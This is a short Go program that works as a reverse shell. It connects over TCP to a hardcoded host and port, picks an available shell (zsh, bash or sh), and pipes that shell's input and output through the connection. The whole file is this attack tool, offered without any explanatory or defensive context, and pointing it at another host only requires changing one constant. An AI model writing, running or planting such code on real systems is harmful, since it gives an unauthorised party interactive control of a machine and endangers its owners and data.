package main

import (
	"errors"
	"log"
	"net"
	"os/exec"
	"sort"
)

// destination host information
const (
	Host = "127.0.0.1"
	Port = "1337"
)

// Shell represents a shell name and priority.
type Shell struct {
	Name     string // e.g., "sh", "bash", "tcsh"
	Priority uint   // 0 is lowest priority
}

// Shells represents the Shell slice structure.
type Shells []Shell

func (s Shells) Len() int {
	return len(s)
}

func (s Shells) Less(i, j int) bool {
	return s[i].Priority < s[j].Priority
}

func (s Shells) Swap(i, j int) {
	s[i], s[j] = s[j], s[i]
}

var shells Shells = []Shell{
	{"sh", 0},
	{"bash", 1},
	// awesome shell!!1
	{"zsh", 100},
}

func connect(host, port string) (net.Conn, error) {
	conn, err := net.Dial("tcp", net.JoinHostPort(host, port))
	if err != nil {
		return nil, err
	}
	return conn, nil
}

func findShell(shells Shells) (string, error) {
	sort.Sort(sort.Reverse(shells))
	for _, shell := range shells {
		path, err := exec.LookPath(shell.Name)
		if err == nil {
			return path, nil
		}
	}
	return "", errors.New("cannot find shells")
}

func run(conn net.Conn, shell string) error {
	cmd := exec.Command(shell)
	cmd.Stdin = conn
	cmd.Stdout = conn
	cmd.Stderr = conn
	return cmd.Run()
}

func main() {
	conn, err := connect(Host, Port)
	if err != nil {
		log.Fatal(err)
	}

	shell, err := findShell(shells)
	if err != nil {
		log.Fatal(err)
	}

	conn.Write([]byte("established!\n"))
	if err := run(conn, shell); err != nil {
		log.Fatal(err)
	}
}
